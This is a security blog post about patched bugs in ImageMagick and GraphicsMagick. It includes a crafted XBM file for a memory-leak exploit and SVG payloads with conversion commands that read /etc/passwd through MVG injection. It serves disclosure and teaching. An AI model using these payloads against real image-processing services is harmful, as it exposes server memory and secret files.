<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Security of Data processing libraries Part 2 - Exploitation | Wow such pwn!</title>
        <meta name="Description" content="Security of Data processing libraries"><meta property="og:title" content="Security of Data processing libraries Part 2 - Exploitation" />
<meta property="og:description" content="Security of Data processing libraries" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/data-processing-libraries-part-two/" />
<meta property="article:published_time" content="2020-02-24T13:20:48+01:00" />
<meta property="article:modified_time" content="2020-02-24T13:20:48+01:00" /><meta property="og:site_name" content="Wow such pwn!" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Security of Data processing libraries Part 2 - Exploitation"/>
<meta name="twitter:description" content="Security of Data processing libraries"/>
<meta name="theme-color" content="#ffffff">
<meta name="msapplication-TileColor" content="#da532c">
<link rel="canonical" href="/data-processing-libraries-part-two/" />
<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="prev" href="/data-processing-libraries-part-one/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/css/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Security of Data processing libraries Part 2 - Exploitation",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "\/data-processing-libraries-part-two\/"
        },"image": {
                "@type": "ImageObject",
                "url": "\/cover.png",
                "width":  800 ,
                "height":  600 
            },"genre": "posts","keywords": "image, vulnerability, exploit","wordcount":  647 ,
        "url": "\/data-processing-libraries-part-two\/","datePublished": "2020-02-24T13:20:48\x2b01:00","dateModified": "2020-02-24T13:20:48\x2b01:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
                "@type": "Organization",
                "name": "xxxx",
                "logo": {
                "@type": "ImageObject",
                "url": "\/logo.png",
                "width":  127 ,
                "height":  40 
                }
            },"description": "Security of Data processing libraries"
    }
    </script></head>
    <body><script>
            if (!window.localStorage || !window.localStorage.getItem('theme')) {window.isDark = 'dark' === 'dark';} else {
                window.isDark = (window.localStorage && window.localStorage.getItem('theme')) === 'dark';
            }
            window.isDark && document.body.classList.add('dark-theme');
        </script><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title animated bounceIn">
            <a href="/">Wow such pwn!</a>
        </div>
        <div class="menu"><a class="menu-item" href="/posts/">Posts</a><a class="menu-item" href="/tags/">Tags</a><a class="menu-item" href="/categories/">Categories</a><a class="menu-item" href="/about/">About</a><a class="menu-item" href="/ru/" title="Русский"><i class="fas fa-language fa-fw"></i></a><a href="javascript:void(0);" class="theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-rotate-180 fa-fw"></i>
            </a>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-wrapper">
        <div class="header-container">
            <div class="header-title animated bounceIn">
                <a href="/">Wow such pwn!</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/ru/" title="Русский"><i class="fas fa-language fa-fw"></i></a><a href="javascript:void(0);" class="theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-rotate-180 fa-fw"></i>
            </a>
        </div>
    </div>
</header>

<script>
    window.desktopHeaderMode = "fixed";
    window.mobileHeaderMode = "auto";
</script>
<main class="main">
                <div class="container"><article class="page single"><h1 class="single-title animated flipInX">Security of Data processing libraries Part 2 - Exploitation</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author">
                    <a class="author" href="https://twitter.com/d4d89704243" rel="author" target="_blank">
                        <i class="fas fa-user-circle fa-fw"></i>d4d
                    </a>
                </span>&nbsp;<span class="post-category">included in&nbsp;
                            <span>
                                <a href="/categories/imagemagick">
                                    <i class="far fa-folder fa-fw"></i>Image magick
                                </a>
                            </span>&nbsp;
                            <span>
                                <a href="/categories/graphicsmagick">
                                    <i class="far fa-folder fa-fw"></i>Graphics magick
                                </a>
                            </span>&nbsp;
                            <span>
                                <a href="/categories/code-review">
                                    <i class="far fa-folder fa-fw"></i>Code review
                                </a>
                            </span></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i><time datetime=2020-02-24>2020-02-24</time>&nbsp;
                <i class="fas fa-pencil-alt fa-fw"></i>about 647 words&nbsp;
                <i class="far fa-clock fa-fw"></i>4 min&nbsp;</div>
        </div><div class="content"><p>Common feature for modern web applications to save and process user files. It can be a avatar generation, file thumbnails, reports or screenshot generation. Open source data processing libraries are usually used for such purposes. There are number of known vulnerabilities at those libraries that can be used to get access to the sensitive informtation. At this article I&rsquo;ll show you how to get access to arbitary file on vulnerable system and lure process memory into your open arms.</p>
<h1 id="bleed-attacks">Bleed attacks</h1>
<p>Bleed vulnerabilities have typically been out-of-bounds reads, but those one are the use of uninitialized memory. An uninitialized image decode buffer is used as the basis for an image rendered back to the client. This leaks server side memory. This type of vulnerability is fairly stealthy compared to an out-of-bounds read because the server will never crash. However, the leaked secrets will be limited to those present in freed heap chunks. More detailes can be found at blog post <a href="https://scarybeastsecurity.blogspot.com/2017/05/bleed-continues-18-byte-file-14k-bounty.html" target="_blank" rel="noopener noreffer">bleed continues: 18 byte file, $14k bounty, for leaking private Yahoo! Mail images</a>
 and <a href="https://github.com/neex/gifoeb" target="_blank" rel="noopener noreffer">exploit for ImageMagick&rsquo;s uninitialized memory disclosure in gif coder</a>
</p>
<h1 id="imagemagick-memory-leak-at-xbm-coder">ImageMagick memory leak at XBM coder</h1>
<p>ReadXBMImage in coders/xbm.c in ImageMagick before <a href="https://github.com/ImageMagick/ImageMagick/commit/216d117f05bff87b9dc4db55a1b1fadb38bcb786" target="_blank" rel="noopener noreffer">7.0.8-9</a>
 leaves data uninitialized when processing an XBM file that has a negative pixel value.
If the affected code is used as a library loaded into a process that includes sensitive information, that information sometimes can be leaked via the image data.
Exploit for ImageMagick&rsquo;s uninitialized memory disclosure in xbm coder.<br>
Auto-generation tool is <a href="https://github.com/d0ge/xbmdump" target="_blank" rel="noopener noreffer">xbmdump</a>
</p>
<h3 id="sample-image">Sample image</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-text" data-lang="text">#define -_width 16
#define -_height 16
static char -_bits[] = {
  0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 0x9bf219b0, 
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, };
</code></pre></td></tr></table>
</div>
</div><p>How to use:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">xbmdump gen 128x128 dump.xbm
</code></pre></td></tr></table>
</div>
</div><h1 id="arbitary-file-read-at-translatetextex-graphicsmagick">Arbitary file read at TranslateTextEx GraphicsMagick</h1>
<p>Local file read vulnerability affects GraphicsMagick before 1.3.32. Multiple decoders that may use MVG syntaxis by default. Malicious user can get access to the local file content.
To exploit this vulnerability untrusted user file should be converted to another format with command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">gm convert exploit.svg output.png
</code></pre></td></tr></table>
</div>
</div><p>exploit.svg is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt;</span>
<span class="cp">&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34;
</span><span class="cp">  &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;</span>
<span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">&#34;1237px&#34;</span> <span class="na">height=</span><span class="s">&#34;1237px&#34;</span> <span class="na">version=</span><span class="s">&#34;1.1&#34;</span>
	<span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns:xlink=</span> <span class="s">&#34;http://www.w3.org/1999/xlink&#34;</span><span class="nt">&gt;</span>
	<span class="nt">&lt;image</span> 
	<span class="na">xlink:href=</span><span class="s">&#34;http://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png&#39; text 128,128 &#39;@/etc/passwd&#34;</span> 
	<span class="na">x=</span><span class="s">&#34;0&#34;</span> <span class="na">y=</span><span class="s">&#34;0&#34;</span> <span class="na">height=</span><span class="s">&#34;137px&#34;</span> <span class="na">width=</span><span class="s">&#34;137px&#34;</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/svg&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Exploit inject custom TextPrimitive inside ImagePrimitive at MVG coder. SVG coder when reads xlink:href attribute do not properly escape ' and any MVG commands can be injected. Function AnnotateImage(annotate.c) reads text from file with TranslateTextEx that accepts &lsquo;@&rsquo; as local file.</p>
<p>Malicious user can exploit this vulnerability at image attributes generation process for SVG coder too.
Attributes generation process at some of the images such as SVG have issue that may allow malicious user read any local file contents.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">gm convert exploit.svg output.png
</code></pre></td></tr></table>
</div>
</div><p>exploit.svg is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt;</span>
<span class="c">&lt;!--@/etc/passwd--&gt;</span>
<span class="cp">&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;</span>
<span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">&#34;1237px&#34;</span> <span class="na">height=</span><span class="s">&#34;1237px&#34;</span> <span class="na">version=</span><span class="s">&#34;1.1&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns:xlink=</span> <span class="s">&#34; http://www.w3.org/1999/xlink&#34;</span><span class="nt">&gt;</span> <span class="nt">&lt;image</span> 
	<span class="na">xlink:href=</span><span class="s">&#34;http://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png&#34;</span> 
	<span class="na">x=</span><span class="s">&#34;0&#34;</span> <span class="na">y=</span><span class="s">&#34;0&#34;</span> <span class="na">height=</span><span class="s">&#34;137px&#34;</span> <span class="na">width=</span><span class="s">&#34;137px&#34;</span><span class="nt">/&gt;&lt;/svg&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Function <code>SetImageAttribute(Image *image,const char *key,const char *value)</code> do not properly translate comments and label for this image that allow attacker to get file contents when image attributes will be written for image formats like JPEG and GIF. To reproduce vulnerability convert image:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">gm convert exploit.svg output.gif
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">gm convert exploit.svg output.jpeg
</code></pre></td></tr></table>
</div>
</div><p>Image attributes (comments section) will contains file contents.</p>
<h1 id="impact">Impact</h1>
<p>We are using /etc/passd file for our PoC. The passwd file is not really very sensitive on modern systems. But real malicious user can get access to secrets and credentials stored at configuration files. Passwords are often baked into files such as Mercurial&rsquo;s hgrc file.  X11&rsquo;s .Xauthority file might be useful on an active desktop system.</p>
<h1 id="acknowledgement">Acknowledgement</h1>
<p>Thanks ImageMagick and GraphicsMagick teams for the coordination and bug fixing!</p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>The article was updated on 2020-02-24</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/data-processing-libraries-part-two/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share"><span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/data-processing-libraries-part-two/" data-title="Security of Data processing libraries Part 2 - Exploitation" data-via="https://twitter.com/d4d89704243" data-hashtags="image,vulnerability,exploit"><i class="fab fa-twitter fa-fw"></i>
</a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/data-processing-libraries-part-two/" data-hashtag="image"><i class="fab fa-facebook-square fa-fw"></i>
</a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/data-processing-libraries-part-two/"><i class="fab fa-linkedin fa-fw"></i>
</a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="/data-processing-libraries-part-two/" data-title="Security of Data processing libraries Part 2 - Exploitation" data-web><i class="fab fa-whatsapp fa-fw"></i>
</a><a href="javascript:void(0);" title="Share on Pinterest" data-sharer="pinterest" data-url="/data-processing-libraries-part-two/" data-description="Security of Data processing libraries"><i class="fab fa-pinterest fa-fw"></i>
</a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="/data-processing-libraries-part-two/" data-title="Security of Data processing libraries Part 2 - Exploitation"><i class="fab fa-hacker-news fa-fw"></i>
</a></span></div>
        </div>
    </div>

    <div class="post-info-more">
        <section><span>
                        <a href="/tags/image">
                            <i class="fas fa-tag fa-fw"></i>image
                        </a>
                    </span>&nbsp;<span>
                        <a href="/tags/vulnerability">
                            <i class="fas fa-tag fa-fw"></i>vulnerability
                        </a>
                    </span>&nbsp;<span>
                        <a href="/tags/exploit">
                            <i class="fas fa-tag fa-fw"></i>exploit
                        </a>
                    </span>&nbsp;</section>
        <section>
            <span><a href="javascript:window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/data-processing-libraries-part-one/" class="prev" rel="prev" title="Security of Data processing libraries Part 1 - Information gathering"><i class="fas fa-angle-left fa-fw"></i>Security of Data processing libraries Part 1 - Information gathering</a></div>
</div>
<div class="comment"></div>
    </article></div>
            </main><footer class="footer">
    <div class="copyright"><div class="copyright-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="external nofollow noopener noreffer">LoveIt<i class="far fa-heart fa-fw"></i></a>
        </div>

        <div class="copyright-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/d4d89704243" target="_blank">d4d</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
    </div>
</footer>
</div><a href="#" class="dynamic-to-top animated faster" id="dynamic-to-top">
            <span>&nbsp;</span>
        </a><script src="/js/lib/smooth-scroll/smooth-scroll.polyfills.min.js"></script><script src="/js/lib/sharer/sharer.min.js"></script><script src="/js/lib/lazysizes/lazysizes.min.js"></script><script src=/js/theme.min.js></script></body>
</html>
